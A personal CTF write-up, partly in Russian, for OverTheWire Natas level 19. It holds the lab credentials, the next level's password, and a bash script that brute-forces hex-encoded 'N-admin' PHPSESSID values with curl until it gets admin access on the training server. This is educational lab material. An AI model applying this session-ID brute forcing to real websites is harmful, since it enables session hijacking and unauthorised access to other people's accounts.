---
tags:
  - ctf
created: 2026-04-06
---

# `Level [19]` 
> **This page uses mostly the same code as the previous level, but session IDs are no longer sequential...**

## 🔐 Учётные данные
| Параметр | Значение                                   |
| -------- | ------------------------------------------ |
| Host     | http://natas19.natas.labs.overthewire.org/ |
| Port     |                                            |
| Login    | natas19                                    |
| Password | tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr           |

## 🎯 Цель уровня
- 
## 🎯 Информация

| Тип информации | Данные             |
| -------------- | ------------------ |
| PHPSESSID      | 3434352d61646d696e |
|                |                    |


## 📚 Ключевые команды/Техники
| Команда | Описание |
| ------- | -------- |
|         |          |
|         |          |
|         |          |

## 💡 Пошаговое решение
| Шаг | Действие                                        | Команда/Код       |
| --- | ----------------------------------------------- | ----------------- |
| 1   | расхешировать идентификатор                     | получаем id=admin |
| 2   | меняем id и хешируем обратно, передаём скриптом |                   |
| 3   |                                                 |                   |

## 🔍 Результат
Флаг/Пароль: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

## 🚪 Переход
-> [Level_19]

## 🔗 Ссылки
- [Название ресурса](URL)

## 🔗 Скрипт 

#!/bin/bash

url=http://natas19.natas.labs.overthewire.org/index.php
auth="natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
success="You are an admin. The credentials for the next level*"


for id in {0..641}
do
    sesid="$id-admin"
    echo "Sesid: $sesid"
    hexid=$(echo -n "$sesid" | xxd -ps)
    echo "Hex: $hexid"
    if(curl \
    -u $auth \
    -b "PHPSESSID=$hexid" \
    -s \
    -o 2>/dev/null \
    -d "username=admin" \
    -d "password=1" \
    $url \
    | grep -A 2 "$success")
    then
        echo "Success"
        break
    fi
done